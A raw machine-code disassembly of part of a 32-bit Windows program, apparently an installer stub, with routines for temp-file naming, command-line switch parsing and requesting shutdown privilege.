  408e00:	64 89 10             	mov    %edx,%fs:(%eax)
  408e03:	68 18 8e 40 00       	push   $0x408e18
  408e08:	8d 45 fc             	lea    -0x4(%ebp),%eax
  408e0b:	e8 88 a3 ff ff       	call   0x403198
  408e10:	c3                   	ret
  408e11:	e9 e6 9f ff ff       	jmp    0x402dfc
  408e16:	eb f0                	jmp    0x408e08
  408e18:	5f                   	pop    %edi
  408e19:	5e                   	pop    %esi
  408e1a:	5b                   	pop    %ebx
  408e1b:	59                   	pop    %ecx
  408e1c:	5d                   	pop    %ebp
  408e1d:	c3                   	ret
  408e1e:	00 00                	add    %al,(%eax)
  408e20:	57                   	push   %edi
  408e21:	6f                   	outsl  %ds:(%esi),(%dx)
  408e22:	77 36                	ja     0x408e5a
  408e24:	34 44                	xor    $0x44,%al
  408e26:	69 73 61 62 6c 65 57 	imul   $0x57656c62,0x61(%ebx),%esi
  408e2d:	6f                   	outsl  %ds:(%esi),(%dx)
  408e2e:	77 36                	ja     0x408e66
  408e30:	34 46                	xor    $0x46,%al
  408e32:	73 52                	jae    0x408e86
  408e34:	65 64 69 72 65 63 74 	gs imul $0x6f697463,%fs:0x65(%edx),%esi
  408e3b:	69 6f 
  408e3d:	6e                   	outsb  %ds:(%esi),(%dx)
  408e3e:	00 00                	add    %al,(%eax)
  408e40:	6b 65 72 6e          	imul   $0x6e,0x72(%ebp),%esp
  408e44:	65 6c                	gs insb (%dx),%es:(%edi)
  408e46:	33 32                	xor    (%edx),%esi
  408e48:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  408e4b:	6c                   	insb   (%dx),%es:(%edi)
  408e4c:	00 00                	add    %al,(%eax)
  408e4e:	00 00                	add    %al,(%eax)
  408e50:	57                   	push   %edi
  408e51:	6f                   	outsl  %ds:(%esi),(%dx)
  408e52:	77 36                	ja     0x408e8a
  408e54:	34 52                	xor    $0x52,%al
  408e56:	65 76 65             	gs jbe 0x408ebe
  408e59:	72 74                	jb     0x408ecf
  408e5b:	57                   	push   %edi
  408e5c:	6f                   	outsl  %ds:(%esi),(%dx)
  408e5d:	77 36                	ja     0x408e95
  408e5f:	34 46                	xor    $0x46,%al
  408e61:	73 52                	jae    0x408eb5
  408e63:	65 64 69 72 65 63 74 	gs imul $0x6f697463,%fs:0x65(%edx),%esi
  408e6a:	69 6f 
  408e6c:	6e                   	outsb  %ds:(%esi),(%dx)
  408e6d:	00 00                	add    %al,(%eax)
  408e6f:	00 ff                	add    %bh,%bh
  408e71:	ff                   	(bad)
  408e72:	ff                   	(bad)
  408e73:	ff 0b                	decl   (%ebx)
  408e75:	00 00                	add    %al,(%eax)
  408e77:	00 73 68             	add    %dh,0x68(%ebx)
  408e7a:	65 6c                	gs insb (%dx),%es:(%edi)
  408e7c:	6c                   	insb   (%dx),%es:(%edi)
  408e7d:	33 32                	xor    (%edx),%esi
  408e7f:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  408e82:	6c                   	insb   (%dx),%es:(%edi)
  408e83:	00 55 8b             	add    %dl,-0x75(%ebp)
  408e86:	ec                   	in     (%dx),%al
  408e87:	6a 00                	push   $0x0
  408e89:	53                   	push   %ebx
  408e8a:	56                   	push   %esi
  408e8b:	57                   	push   %edi
  408e8c:	8b fa                	mov    %edx,%edi
  408e8e:	8b f0                	mov    %eax,%esi
  408e90:	33 c0                	xor    %eax,%eax
  408e92:	55                   	push   %ebp
  408e93:	68 e8 8e 40 00       	push   $0x408ee8
  408e98:	64 ff 30             	push   %fs:(%eax)
  408e9b:	64 89 20             	mov    %esp,%fs:(%eax)
  408e9e:	8b c7                	mov    %edi,%eax
  408ea0:	e8 f3 a2 ff ff       	call   0x403198
  408ea5:	bb 05 00 00 00       	mov    $0x5,%ebx
  408eaa:	8d 45 fc             	lea    -0x4(%ebp),%eax
  408ead:	8b d6                	mov    %esi,%edx
  408eaf:	83 e2 1f             	and    $0x1f,%edx
  408eb2:	8a 92 14 a2 40 00    	mov    0x40a214(%edx),%dl
  408eb8:	e8 eb a3 ff ff       	call   0x4032a8
  408ebd:	8b 45 fc             	mov    -0x4(%ebp),%eax
  408ec0:	8b d7                	mov    %edi,%edx
  408ec2:	b9 01 00 00 00       	mov    $0x1,%ecx
  408ec7:	e8 c8 a5 ff ff       	call   0x403494
  408ecc:	c1 ee 05             	shr    $0x5,%esi
  408ecf:	4b                   	dec    %ebx
  408ed0:	75 d8                	jne    0x408eaa
  408ed2:	33 c0                	xor    %eax,%eax
  408ed4:	5a                   	pop    %edx
  408ed5:	59                   	pop    %ecx
  408ed6:	59                   	pop    %ecx
  408ed7:	64 89 10             	mov    %edx,%fs:(%eax)
  408eda:	68 ef 8e 40 00       	push   $0x408eef
  408edf:	8d 45 fc             	lea    -0x4(%ebp),%eax
  408ee2:	e8 b1 a2 ff ff       	call   0x403198
  408ee7:	c3                   	ret
  408ee8:	e9 0f 9f ff ff       	jmp    0x402dfc
  408eed:	eb f0                	jmp    0x408edf
  408eef:	5f                   	pop    %edi
  408ef0:	5e                   	pop    %esi
  408ef1:	5b                   	pop    %ebx
  408ef2:	59                   	pop    %ecx
  408ef3:	5d                   	pop    %ebp
  408ef4:	c3                   	ret
  408ef5:	8d 40 00             	lea    0x0(%eax),%eax
  408ef8:	55                   	push   %ebp
  408ef9:	8b ec                	mov    %esp,%ebp
  408efb:	6a 00                	push   $0x0
  408efd:	6a 00                	push   $0x0
  408eff:	6a 00                	push   $0x0
  408f01:	6a 00                	push   $0x0
  408f03:	6a 00                	push   $0x0
  408f05:	53                   	push   %ebx
  408f06:	56                   	push   %esi
  408f07:	57                   	push   %edi
  408f08:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  408f0b:	89 55 fc             	mov    %edx,-0x4(%ebp)
  408f0e:	8b d8                	mov    %eax,%ebx
  408f10:	8b 45 fc             	mov    -0x4(%ebp),%eax
  408f13:	e8 ec a4 ff ff       	call   0x403404
  408f18:	33 c0                	xor    %eax,%eax
  408f1a:	55                   	push   %ebp
  408f1b:	68 e6 8f 40 00       	push   $0x408fe6
  408f20:	64 ff 30             	push   %fs:(%eax)
  408f23:	64 89 20             	mov    %esp,%fs:(%eax)
  408f26:	8d 55 f0             	lea    -0x10(%ebp),%edx
  408f29:	8b 45 fc             	mov    -0x4(%ebp),%eax
  408f2c:	e8 63 d6 ff ff       	call   0x406594
  408f31:	8b 55 f0             	mov    -0x10(%ebp),%edx
  408f34:	8d 45 fc             	lea    -0x4(%ebp),%eax
  408f37:	e8 f0 a2 ff ff       	call   0x40322c
  408f3c:	b8 00 00 00 02       	mov    $0x2000000,%eax
  408f41:	e8 56 98 ff ff       	call   0x40279c
  408f46:	8b f0                	mov    %eax,%esi
  408f48:	8b fe                	mov    %esi,%edi
  408f4a:	47                   	inc    %edi
  408f4b:	81 ff ff ff ff 01    	cmp    $0x1ffffff,%edi
  408f51:	7e 02                	jle    0x408f55
  408f53:	33 ff                	xor    %edi,%edi
  408f55:	3b f7                	cmp    %edi,%esi
  408f57:	75 2c                	jne    0x408f85
  408f59:	8d 55 ec             	lea    -0x14(%ebp),%edx
  408f5c:	8b 45 fc             	mov    -0x4(%ebp),%eax
  408f5f:	e8 f8 d7 ff ff       	call   0x40675c
  408f64:	8b 55 ec             	mov    -0x14(%ebp),%edx
  408f67:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  408f6a:	b0 45                	mov    $0x45,%al
  408f6c:	e8 3f fb ff ff       	call   0x408ab0
  408f71:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  408f74:	b2 01                	mov    $0x1,%dl
  408f76:	b8 b0 45 40 00       	mov    $0x4045b0,%eax
  408f7b:	e8 60 c8 ff ff       	call   0x4057e0
  408f80:	e8 2f 9f ff ff       	call   0x402eb4
  408f85:	ff 75 fc             	push   -0x4(%ebp)
  408f88:	68 00 90 40 00       	push   $0x409000
  408f8d:	8d 55 f0             	lea    -0x10(%ebp),%edx
  408f90:	8b c7                	mov    %edi,%eax
  408f92:	e8 ed fe ff ff       	call   0x408e84
  408f97:	ff 75 f0             	push   -0x10(%ebp)
  408f9a:	ff 75 f8             	push   -0x8(%ebp)
  408f9d:	8d 45 f4             	lea    -0xc(%ebp),%eax
  408fa0:	ba 04 00 00 00       	mov    $0x4,%edx
  408fa5:	e8 0a a4 ff ff       	call   0x4033b4
  408faa:	8b 55 f4             	mov    -0xc(%ebp),%edx
  408fad:	8b c3                	mov    %ebx,%eax
  408faf:	e8 54 fd ff ff       	call   0x408d08
  408fb4:	84 c0                	test   %al,%al
  408fb6:	75 92                	jne    0x408f4a
  408fb8:	8b 45 08             	mov    0x8(%ebp),%eax
  408fbb:	8b 55 f4             	mov    -0xc(%ebp),%edx
  408fbe:	e8 69 a2 ff ff       	call   0x40322c
  408fc3:	33 c0                	xor    %eax,%eax
  408fc5:	5a                   	pop    %edx
  408fc6:	59                   	pop    %ecx
  408fc7:	59                   	pop    %ecx
  408fc8:	64 89 10             	mov    %edx,%fs:(%eax)
  408fcb:	68 ed 8f 40 00       	push   $0x408fed
  408fd0:	8d 45 ec             	lea    -0x14(%ebp),%eax
  408fd3:	ba 03 00 00 00       	mov    $0x3,%edx
  408fd8:	e8 db a1 ff ff       	call   0x4031b8
  408fdd:	8d 45 fc             	lea    -0x4(%ebp),%eax
  408fe0:	e8 b3 a1 ff ff       	call   0x403198
  408fe5:	c3                   	ret
  408fe6:	e9 11 9e ff ff       	jmp    0x402dfc
  408feb:	eb e3                	jmp    0x408fd0
  408fed:	5f                   	pop    %edi
  408fee:	5e                   	pop    %esi
  408fef:	5b                   	pop    %ebx
  408ff0:	8b e5                	mov    %ebp,%esp
  408ff2:	5d                   	pop    %ebp
  408ff3:	c2 04 00             	ret    $0x4
  408ff6:	00 00                	add    %al,(%eax)
  408ff8:	ff                   	(bad)
  408ff9:	ff                   	(bad)
  408ffa:	ff                   	(bad)
  408ffb:	ff 03                	incl   (%ebx)
  408ffd:	00 00                	add    %al,(%eax)
  408fff:	00 69 73             	add    %ch,0x73(%ecx)
  409002:	2d 00 55 8b ec       	sub    $0xec8b5500,%eax
  409007:	33 c9                	xor    %ecx,%ecx
  409009:	51                   	push   %ecx
  40900a:	51                   	push   %ecx
  40900b:	51                   	push   %ecx
  40900c:	51                   	push   %ecx
  40900d:	51                   	push   %ecx
  40900e:	51                   	push   %ecx
  40900f:	51                   	push   %ecx
  409010:	51                   	push   %ecx
  409011:	53                   	push   %ebx
  409012:	56                   	push   %esi
  409013:	57                   	push   %edi
  409014:	8b f0                	mov    %eax,%esi
  409016:	33 c0                	xor    %eax,%eax
  409018:	55                   	push   %ebp
  409019:	68 f3 90 40 00       	push   $0x4090f3
  40901e:	64 ff 30             	push   %fs:(%eax)
  409021:	64 89 20             	mov    %esp,%fs:(%eax)
  409024:	8d 45 fc             	lea    -0x4(%ebp),%eax
  409027:	50                   	push   %eax
  409028:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40902b:	e8 b4 da ff ff       	call   0x406ae4
  409030:	8b 55 f8             	mov    -0x8(%ebp),%edx
  409033:	b9 0c 91 40 00       	mov    $0x40910c,%ecx
  409038:	33 c0                	xor    %eax,%eax
  40903a:	e8 b9 fe ff ff       	call   0x408ef8
  40903f:	6a 00                	push   $0x0
  409041:	8b 45 fc             	mov    -0x4(%ebp),%eax
  409044:	e8 cb a3 ff ff       	call   0x403414
  409049:	50                   	push   %eax
  40904a:	e8 7d b3 ff ff       	call   0x4043cc
  40904f:	85 c0                	test   %eax,%eax
  409051:	75 6e                	jne    0x4090c1
  409053:	e8 ec b3 ff ff       	call   0x404444
  409058:	8b d8                	mov    %eax,%ebx
  40905a:	81 fb b7 00 00 00    	cmp    $0xb7,%ebx
  409060:	74 c2                	je     0x409024
  409062:	8d 45 f8             	lea    -0x8(%ebp),%eax
  409065:	50                   	push   %eax
  409066:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  409069:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40906c:	b0 2f                	mov    $0x2f,%al
  40906e:	e8 3d fa ff ff       	call   0x408ab0
  409073:	8b 45 e8             	mov    -0x18(%ebp),%eax
  409076:	89 45 ec             	mov    %eax,-0x14(%ebp)
  409079:	8d 55 e4             	lea    -0x1c(%ebp),%edx
  40907c:	8b c3                	mov    %ebx,%eax
  40907e:	e8 61 bb ff ff       	call   0x404be4
  409083:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  409086:	89 45 f0             	mov    %eax,-0x10(%ebp)
  409089:	8d 55 e0             	lea    -0x20(%ebp),%edx
  40908c:	8b c3                	mov    %ebx,%eax
  40908e:	e8 c9 df ff ff       	call   0x40705c
  409093:	8b 45 e0             	mov    -0x20(%ebp),%eax
  409096:	89 45 f4             	mov    %eax,-0xc(%ebp)
  409099:	8d 55 ec             	lea    -0x14(%ebp),%edx
  40909c:	b9 02 00 00 00       	mov    $0x2,%ecx
  4090a1:	b0 60                	mov    $0x60,%al
  4090a3:	e8 d8 f9 ff ff       	call   0x408a80
  4090a8:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  4090ab:	b2 01                	mov    $0x1,%dl
  4090ad:	b8 b0 45 40 00       	mov    $0x4045b0,%eax
  4090b2:	e8 29 c7 ff ff       	call   0x4057e0
  4090b7:	e8 f8 9d ff ff       	call   0x402eb4
  4090bc:	e9 63 ff ff ff       	jmp    0x409024
  4090c1:	8b c6                	mov    %esi,%eax
  4090c3:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4090c6:	e8 61 a1 ff ff       	call   0x40322c
  4090cb:	33 c0                	xor    %eax,%eax
  4090cd:	5a                   	pop    %edx
  4090ce:	59                   	pop    %ecx
  4090cf:	59                   	pop    %ecx
  4090d0:	64 89 10             	mov    %edx,%fs:(%eax)
  4090d3:	68 fa 90 40 00       	push   $0x4090fa
  4090d8:	8d 45 e0             	lea    -0x20(%ebp),%eax
  4090db:	ba 03 00 00 00       	mov    $0x3,%edx
  4090e0:	e8 d3 a0 ff ff       	call   0x4031b8
  4090e5:	8d 45 f8             	lea    -0x8(%ebp),%eax
  4090e8:	ba 02 00 00 00       	mov    $0x2,%edx
  4090ed:	e8 c6 a0 ff ff       	call   0x4031b8
  4090f2:	c3                   	ret
  4090f3:	e9 04 9d ff ff       	jmp    0x402dfc
  4090f8:	eb de                	jmp    0x4090d8
  4090fa:	5f                   	pop    %edi
  4090fb:	5e                   	pop    %esi
  4090fc:	5b                   	pop    %ebx
  4090fd:	8b e5                	mov    %ebp,%esp
  4090ff:	5d                   	pop    %ebp
  409100:	c3                   	ret
  409101:	00 00                	add    %al,(%eax)
  409103:	00 ff                	add    %bh,%bh
  409105:	ff                   	(bad)
  409106:	ff                   	(bad)
  409107:	ff 04 00             	incl   (%eax,%eax,1)
  40910a:	00 00                	add    %al,(%eax)
  40910c:	2e 74 6d             	je,pn  0x40917c
  40910f:	70 00                	jo     0x409111
  409111:	00 00                	add    %al,(%eax)
  409113:	00 ff                	add    %bh,%bh
  409115:	25 4c c2 40 00       	and    $0x40c24c,%eax
  40911a:	8b c0                	mov    %eax,%eax
  40911c:	6a 30                	push   $0x30
  40911e:	a1 6c ba 40 00       	mov    0x40ba6c,%eax
  409123:	e8 ec a2 ff ff       	call   0x403414
  409128:	50                   	push   %eax
  409129:	a1 64 ba 40 00       	mov    0x40ba64,%eax
  40912e:	e8 e1 a2 ff ff       	call   0x403414
  409133:	50                   	push   %eax
  409134:	6a 00                	push   $0x0
  409136:	e8 19 b4 ff ff       	call   0x404554
  40913b:	c3                   	ret
  40913c:	83 c4 ec             	add    $0xffffffec,%esp
  40913f:	83 3d 7c a0 40 00 02 	cmpl   $0x2,0x40a07c
  409146:	75 61                	jne    0x4091a9
  409148:	54                   	push   %esp
  409149:	6a 28                	push   $0x28
  40914b:	e8 c4 b2 ff ff       	call   0x404414
  409150:	50                   	push   %eax
  409151:	e8 4e b2 ff ff       	call   0x4043a4
  409156:	85 c0                	test   %eax,%eax
  409158:	75 07                	jne    0x409161
  40915a:	e8 bd ff ff ff       	call   0x40911c
  40915f:	eb 5a                	jmp    0x4091bb
  409161:	8d 44 24 08          	lea    0x8(%esp),%eax
  409165:	50                   	push   %eax
  409166:	68 c0 91 40 00       	push   $0x4091c0
  40916b:	6a 00                	push   $0x0
  40916d:	e8 2a b2 ff ff       	call   0x40439c
  409172:	c7 44 24 04 01 00 00 	movl   $0x1,0x4(%esp)
  409179:	00 
  40917a:	c7 44 24 10 02 00 00 	movl   $0x2,0x10(%esp)
  409181:	00 
  409182:	6a 00                	push   $0x0
  409184:	6a 00                	push   $0x0
  409186:	6a 00                	push   $0x0
  409188:	8d 44 24 10          	lea    0x10(%esp),%eax
  40918c:	50                   	push   %eax
  40918d:	6a 00                	push   $0x0
  40918f:	8b 44 24 14          	mov    0x14(%esp),%eax
  409193:	50                   	push   %eax
  409194:	e8 7b ff ff ff       	call   0x409114
  409199:	e8 a6 b2 ff ff       	call   0x404444
  40919e:	85 c0                	test   %eax,%eax
  4091a0:	74 07                	je     0x4091a9
  4091a2:	e8 75 ff ff ff       	call   0x40911c
  4091a7:	eb 12                	jmp    0x4091bb
  4091a9:	6a 00                	push   $0x0
  4091ab:	6a 02                	push   $0x2
  4091ad:	e8 92 b3 ff ff       	call   0x404544
  4091b2:	85 c0                	test   %eax,%eax
  4091b4:	75 05                	jne    0x4091bb
  4091b6:	e8 61 ff ff ff       	call   0x40911c
  4091bb:	83 c4 14             	add    $0x14,%esp
  4091be:	c3                   	ret
  4091bf:	00 53 65             	add    %dl,0x65(%ebx)
  4091c2:	53                   	push   %ebx
  4091c3:	68 75 74 64 6f       	push   $0x6f647475
  4091c8:	77 6e                	ja     0x409238
  4091ca:	50                   	push   %eax
  4091cb:	72 69                	jb     0x409236
  4091cd:	76 69                	jbe    0x409238
  4091cf:	6c                   	insb   (%dx),%es:(%edi)
  4091d0:	65 67 65 00 55 8b    	gs add %dl,%gs:-0x75(%di)
  4091d6:	ec                   	in     (%dx),%al
  4091d7:	51                   	push   %ecx
  4091d8:	53                   	push   %ebx
  4091d9:	56                   	push   %esi
  4091da:	57                   	push   %edi
  4091db:	89 55 fc             	mov    %edx,-0x4(%ebp)
  4091de:	8b d8                	mov    %eax,%ebx
  4091e0:	8b f1                	mov    %ecx,%esi
  4091e2:	4e                   	dec    %esi
  4091e3:	85 f6                	test   %esi,%esi
  4091e5:	7c 47                	jl     0x40922e
  4091e7:	46                   	inc    %esi
  4091e8:	33 ff                	xor    %edi,%edi
  4091ea:	83 ff 01             	cmp    $0x1,%edi
  4091ed:	75 0b                	jne    0x4091fa
  4091ef:	8b 45 0c             	mov    0xc(%ebp),%eax
  4091f2:	50                   	push   %eax
  4091f3:	e8 f4 b2 ff ff       	call   0x4044ec
  4091f8:	eb 0e                	jmp    0x409208
  4091fa:	83 ff 01             	cmp    $0x1,%edi
  4091fd:	7e 09                	jle    0x409208
  4091ff:	8b 45 08             	mov    0x8(%ebp),%eax
  409202:	50                   	push   %eax
  409203:	e8 e4 b2 ff ff       	call   0x4044ec
  409208:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40920b:	8b c3                	mov    %ebx,%eax
  40920d:	e8 7e fa ff ff       	call   0x408c90
  409212:	85 c0                	test   %eax,%eax
  409214:	75 18                	jne    0x40922e
  409216:	e8 29 b2 ff ff       	call   0x404444
  40921b:	83 f8 02             	cmp    $0x2,%eax
  40921e:	74 0e                	je     0x40922e
  409220:	e8 1f b2 ff ff       	call   0x404444
  409225:	83 f8 03             	cmp    $0x3,%eax
  409228:	74 04                	je     0x40922e
  40922a:	47                   	inc    %edi
  40922b:	4e                   	dec    %esi
  40922c:	75 bc                	jne    0x4091ea
  40922e:	5f                   	pop    %edi
  40922f:	5e                   	pop    %esi
  409230:	5b                   	pop    %ebx
  409231:	59                   	pop    %ecx
  409232:	5d                   	pop    %ebp
  409233:	c2 08 00             	ret    $0x8
  409236:	8b c0                	mov    %eax,%eax
  409238:	55                   	push   %ebp
  409239:	8b ec                	mov    %esp,%ebp
  40923b:	83 c4 e8             	add    $0xffffffe8,%esp
  40923e:	53                   	push   %ebx
  40923f:	56                   	push   %esi
  409240:	57                   	push   %edi
  409241:	33 d2                	xor    %edx,%edx
  409243:	89 55 fc             	mov    %edx,-0x4(%ebp)
  409246:	89 55 ec             	mov    %edx,-0x14(%ebp)
  409249:	89 55 e8             	mov    %edx,-0x18(%ebp)
  40924c:	8b d8                	mov    %eax,%ebx
  40924e:	33 c0                	xor    %eax,%eax
  409250:	55                   	push   %ebp
  409251:	68 db 92 40 00       	push   $0x4092db
  409256:	64 ff 30             	push   %fs:(%eax)
  409259:	64 89 20             	mov    %esp,%fs:(%eax)
  40925c:	e8 e3 b1 ff ff       	call   0x404444
  409261:	8b f0                	mov    %eax,%esi
  409263:	8d 45 fc             	lea    -0x4(%ebp),%eax
  409266:	50                   	push   %eax
  409267:	33 c0                	xor    %eax,%eax
  409269:	8a c3                	mov    %bl,%al
  40926b:	8b 04 85 5c b9 40 00 	mov    0x40b95c(,%eax,4),%eax
  409272:	89 45 f0             	mov    %eax,-0x10(%ebp)
  409275:	8d 55 ec             	lea    -0x14(%ebp),%edx
  409278:	8b c6                	mov    %esi,%eax
  40927a:	e8 65 b9 ff ff       	call   0x404be4
  40927f:	8b 45 ec             	mov    -0x14(%ebp),%eax
  409282:	89 45 f4             	mov    %eax,-0xc(%ebp)
  409285:	8d 55 e8             	lea    -0x18(%ebp),%edx
  409288:	8b c6                	mov    %esi,%eax
  40928a:	e8 cd dd ff ff       	call   0x40705c
  40928f:	8b 45 e8             	mov    -0x18(%ebp),%eax
  409292:	89 45 f8             	mov    %eax,-0x8(%ebp)
  409295:	8d 55 f0             	lea    -0x10(%ebp),%edx
  409298:	b9 02 00 00 00       	mov    $0x2,%ecx
  40929d:	b0 60                	mov    $0x60,%al
  40929f:	e8 dc f7 ff ff       	call   0x408a80
  4092a4:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4092a7:	b2 01                	mov    $0x1,%dl
  4092a9:	b8 b0 45 40 00       	mov    $0x4045b0,%eax
  4092ae:	e8 2d c5 ff ff       	call   0x4057e0
  4092b3:	e8 fc 9b ff ff       	call   0x402eb4
  4092b8:	33 c0                	xor    %eax,%eax
  4092ba:	5a                   	pop    %edx
  4092bb:	59                   	pop    %ecx
  4092bc:	59                   	pop    %ecx
  4092bd:	64 89 10             	mov    %edx,%fs:(%eax)
  4092c0:	68 e2 92 40 00       	push   $0x4092e2
  4092c5:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4092c8:	ba 02 00 00 00       	mov    $0x2,%edx
  4092cd:	e8 e6 9e ff ff       	call   0x4031b8
  4092d2:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4092d5:	e8 be 9e ff ff       	call   0x403198
  4092da:	c3                   	ret
  4092db:	e9 1c 9b ff ff       	jmp    0x402dfc
  4092e0:	eb e3                	jmp    0x4092c5
  4092e2:	5f                   	pop    %edi
  4092e3:	5e                   	pop    %esi
  4092e4:	5b                   	pop    %ebx
  4092e5:	8b e5                	mov    %ebp,%esp
  4092e7:	5d                   	pop    %ebp
  4092e8:	c3                   	ret
  4092e9:	8d 40 00             	lea    0x0(%eax),%eax
  4092ec:	55                   	push   %ebp
  4092ed:	8b ec                	mov    %esp,%ebp
  4092ef:	6a 00                	push   $0x0
  4092f1:	53                   	push   %ebx
  4092f2:	56                   	push   %esi
  4092f3:	57                   	push   %edi
  4092f4:	33 c0                	xor    %eax,%eax
  4092f6:	55                   	push   %ebp
  4092f7:	68 4b 93 40 00       	push   $0x40934b
  4092fc:	64 ff 30             	push   %fs:(%eax)
  4092ff:	64 89 20             	mov    %esp,%fs:(%eax)
  409302:	e8 f5 c2 ff ff       	call   0x4055fc
  409307:	ba 00 46 40 00       	mov    $0x404600,%edx
  40930c:	e8 5b 96 ff ff       	call   0x40296c
  409311:	84 c0                	test   %al,%al
  409313:	75 20                	jne    0x409335
  409315:	6a 10                	push   $0x10
  409317:	a1 6c ba 40 00       	mov    0x40ba6c,%eax
  40931c:	50                   	push   %eax
  40931d:	8d 45 fc             	lea    -0x4(%ebp),%eax
  409320:	e8 bf dc ff ff       	call   0x406fe4
  409325:	8b 45 fc             	mov    -0x4(%ebp),%eax
  409328:	e8 e7 a0 ff ff       	call   0x403414
  40932d:	50                   	push   %eax
  40932e:	6a 00                	push   $0x0
  409330:	e8 1f b2 ff ff       	call   0x404554
  409335:	33 c0                	xor    %eax,%eax
  409337:	5a                   	pop    %edx
  409338:	59                   	pop    %ecx
  409339:	59                   	pop    %ecx
  40933a:	64 89 10             	mov    %edx,%fs:(%eax)
  40933d:	68 52 93 40 00       	push   $0x409352
  409342:	8d 45 fc             	lea    -0x4(%ebp),%eax
  409345:	e8 4e 9e ff ff       	call   0x403198
  40934a:	c3                   	ret
  40934b:	e9 ac 9a ff ff       	jmp    0x402dfc
  409350:	eb f0                	jmp    0x409342
  409352:	5f                   	pop    %edi
  409353:	5e                   	pop    %esi
  409354:	5b                   	pop    %ebx
  409355:	59                   	pop    %ecx
  409356:	5d                   	pop    %ebp
  409357:	c3                   	ret
  409358:	55                   	push   %ebp
  409359:	8b ec                	mov    %esp,%ebp
  40935b:	6a 00                	push   $0x0
  40935d:	6a 00                	push   $0x0
  40935f:	53                   	push   %ebx
  409360:	56                   	push   %esi
  409361:	57                   	push   %edi
  409362:	33 c0                	xor    %eax,%eax
  409364:	55                   	push   %ebp
  409365:	68 01 94 40 00       	push   $0x409401
  40936a:	64 ff 30             	push   %fs:(%eax)
  40936d:	64 89 20             	mov    %esp,%fs:(%eax)
  409370:	e8 3b d6 ff ff       	call   0x4069b0
  409375:	8b d8                	mov    %eax,%ebx
  409377:	85 db                	test   %ebx,%ebx
  409379:	7e 6b                	jle    0x4093e6
  40937b:	be 01 00 00 00       	mov    $0x1,%esi
  409380:	8d 55 fc             	lea    -0x4(%ebp),%edx
  409383:	8b c6                	mov    %esi,%eax
  409385:	e8 92 d6 ff ff       	call   0x406a1c
  40938a:	ba 18 94 40 00       	mov    $0x409418,%edx
  40938f:	8b 45 fc             	mov    -0x4(%ebp),%eax
  409392:	e8 f9 b7 ff ff       	call   0x404b90
  409397:	85 c0                	test   %eax,%eax
  409399:	75 09                	jne    0x4093a4
  40939b:	c6 05 34 a2 40 00 01 	movb   $0x1,0x40a234
  4093a2:	eb 3e                	jmp    0x4093e2
  4093a4:	8d 45 f8             	lea    -0x8(%ebp),%eax
  4093a7:	50                   	push   %eax
  4093a8:	b9 06 00 00 00       	mov    $0x6,%ecx
  4093ad:	ba 01 00 00 00       	mov    $0x1,%edx
  4093b2:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4093b5:	e8 9a a0 ff ff       	call   0x403454
  4093ba:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4093bd:	ba 28 94 40 00       	mov    $0x409428,%edx
  4093c2:	e8 c9 b7 ff ff       	call   0x404b90
  4093c7:	85 c0                	test   %eax,%eax
  4093c9:	75 17                	jne    0x4093e2
  4093cb:	68 a4 bc 40 00       	push   $0x40bca4
  4093d0:	b9 ff ff ff 7f       	mov    $0x7fffffff,%ecx
  4093d5:	ba 07 00 00 00       	mov    $0x7,%edx
  4093da:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4093dd:	e8 72 a0 ff ff       	call   0x403454
  4093e2:	46                   	inc    %esi
  4093e3:	4b                   	dec    %ebx
  4093e4:	75 9a                	jne    0x409380
  4093e6:	33 c0                	xor    %eax,%eax
  4093e8:	5a                   	pop    %edx
  4093e9:	59                   	pop    %ecx
  4093ea:	59                   	pop    %ecx
  4093eb:	64 89 10             	mov    %edx,%fs:(%eax)
  4093ee:	68 08 94 40 00       	push   $0x409408
  4093f3:	8d 45 f8             	lea    -0x8(%ebp),%eax
  4093f6:	ba 02 00 00 00       	mov    $0x2,%edx
  4093fb:	e8 b8 9d ff ff       	call   0x4031b8
  409400:	c3                   	ret
  409401:	e9 f6 99 ff ff       	jmp    0x402dfc
  409406:	eb eb                	jmp    0x4093f3
  409408:	5f                   	pop    %edi
  409409:	5e                   	pop    %esi
  40940a:	5b                   	pop    %ebx
  40940b:	59                   	pop    %ecx
  40940c:	59                   	pop    %ecx
  40940d:	5d                   	pop    %ebp
  40940e:	c3                   	ret
  40940f:	00 ff                	add    %bh,%bh
  409411:	ff                   	(bad)
  409412:	ff                   	(bad)
  409413:	ff 04 00             	incl   (%eax,%eax,1)
  409416:	00 00                	add    %al,(%eax)
  409418:	2f                   	das
  409419:	53                   	push   %ebx
  40941a:	50                   	push   %eax
  40941b:	2d 00 00 00 00       	sub    $0x0,%eax
  409420:	ff                   	(bad)
  409421:	ff                   	(bad)
  409422:	ff                   	(bad)
  409423:	ff 06                	incl   (%esi)
  409425:	00 00                	add    %al,(%eax)
  409427:	00 2f                	add    %ch,(%edi)
  409429:	4c                   	dec    %esp
  40942a:	61                   	popa
  40942b:	6e                   	outsb  %ds:(%esi),(%dx)
  40942c:	67 3d 00 00 53 56    	addr16 cmp $0x56530000,%eax
  409432:	8b d8                	mov    %eax,%ebx
  409434:	85 db                	test   %ebx,%ebx
  409436:	7c 3e                	jl     0x409476
  409438:	3b 1d cc bd 40 00    	cmp    0x40bdcc,%ebx
  40943e:	7d 36                	jge    0x409476
  409440:	3b 1d 38 a2 40 00    	cmp    0x40a238,%ebx
  409446:	74 2e                	je     0x409476
  409448:	8b f3                	mov    %ebx,%esi
  40944a:	c1 e6 03             	shl    $0x3,%esi
  40944d:	a1 c8 bd 40 00       	mov    0x40bdc8,%eax
  409452:	8b 44 f0 18          	mov    0x18(%eax,%esi,8),%eax
  409456:	e8 99 9e ff ff       	call   0x4032f4
  40945b:	50                   	push   %eax
